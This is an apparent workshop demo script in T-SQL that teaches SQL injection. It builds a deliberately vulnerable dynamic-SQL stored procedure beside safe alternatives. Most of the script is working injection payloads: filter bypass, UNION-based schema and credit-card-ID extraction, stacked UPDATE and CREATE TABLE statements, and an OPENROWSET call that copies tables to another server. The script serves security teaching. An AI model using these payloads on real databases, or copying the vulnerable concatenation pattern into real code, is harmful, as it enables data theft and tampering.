-------------------------------------------------------------------------------------
-- Workshop: SQL Server for Application Developers
-- Module 5: SQL Injection
-- Milos Radivojevic, Data Platform MVP, bwin, Austria
-- E: milos.radivojevic@chello.at
-- W: https://milossql.wordpress.com/
-------------------------------------------------------------------------------------
USE WideWorldImporters;
GO

CREATE OR ALTER PROCEDURE dbo.uspGetContactsStatic
@SearchName NVARCHAR(50)
AS
BEGIN
	SET NOCOUNT ON;
	SELECT PersonID,FullName,EmailAddress,IsEmployee FROM Application.People 
	WHERE FullName LIKE @SearchName + '%';
END
GO
 

CREATE OR ALTER PROCEDURE dbo.uspGetContactsDynamic
@SearchName NVARCHAR(500)
AS
BEGIN
	DECLARE @sql NVARCHAR(3000);
	SET @sql =N'SELECT PersonID,FullName,EmailAddress,IsEmployee FROM Application.People 
	WHERE FullName LIKE N''' + @SearchName + '%'''
	PRINT (@sql);
	EXEC (@sql);
END
GO
 
CREATE OR ALTER PROCEDURE  dbo.uspGetContactsDynamic2
@SearchName NVARCHAR(500)
AS
BEGIN
	DECLARE @sql NVARCHAR(3000);
	DECLARE @name NVARCHAR(500) = @SearchName + '%'
 
	SET @sql =N'SELECT PersonID,FullName,EmailAddress,IsEmployee FROM Application.People 
	WHERE FullName LIKE @n ';
	EXECUTE  sp_executesql @sql,N'@n NVARCHAR(500)',@n = @name;
END
GO

--normal search
EXEC dbo.uspGetContactsDynamic N'Etha';
EXEC dbo.uspGetContactsDynamic N'Et%';
--skipping the filter
EXEC dbo.uspGetContactsDynamic N'Et%'' OR 1=1--';

--explore
EXEC dbo.uspGetContactsDynamic N'Etha%'' UNION ALL SELECT 1,SCHEMA_NAME(schema_id),name  FROM sys.tables--';
EXEC dbo.uspGetContactsDynamic N'Etha%'' UNION ALL SELECT object_id,SCHEMA_NAME(schema_id),name  FROM sys.tables--';
EXEC dbo.uspGetContactsDynamic N'Etha%'' UNION ALL SELECT object_id,  name,name  FROM sys.columns where object_id=1922105888--';
EXEC dbo.uspGetContactsDynamic N'Etha%'' UNION ALL SELECT SalesOrderID,  CAST(DueDate AS NVARCHAR),CAST(CreditCardID AS NVARCHAR) FROM Sales.SalesOrderHeader--';

 
--manipulate
EXEC dbo.uspGetContactsDynamic N'Etha';
EXEC dbo.uspGetContactsDynamic N'Etha%''; UPDATE Application.People SET FullName=''Mile Kitic'' WHERE PersonID=11--';
EXEC dbo.uspGetContactsDynamic N'Etha';
EXEC dbo.uspGetContactsDynamic N'Etha%''; UPDATE Application.People SET FullName=''Ethan Onslow'' WHERE PersonID=11--';
EXEC dbo.uspGetContactsDynamic N'Etha';
 
--create table
-- drop table   dbo.KK 
EXEC dbo.uspGetContactsDynamic N'Etha%'';CREATE TABLE dbo.KK(id INT)--';


--OPENROWSET

-- check the configured value for Ad Hoc Distributed Querie 
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ad Hoc Distributed Queries' 
--set to 1
sp_configure 'Ad Hoc Distributed Queries', 1
RECONFIGURE;
GO
-- 1.2 get all tables into a "hacker" table dbo.mytables
 EXEC dbo.uspGetContactsDynamic  N'Etha%'';INSERT INTO OPENROWSET(''SQLNCLI'',''Server=YourServer;Database=M;Trusted_Connection=yes;'',''SELECT * FROM HakovaneTabele'')  SELECT * FROM sys.tables--'
 
 --can you have SQL injection with static sps?
 --Yes!
 --Etha'; CREATE TABLE dbo.Marinko(id INT)--

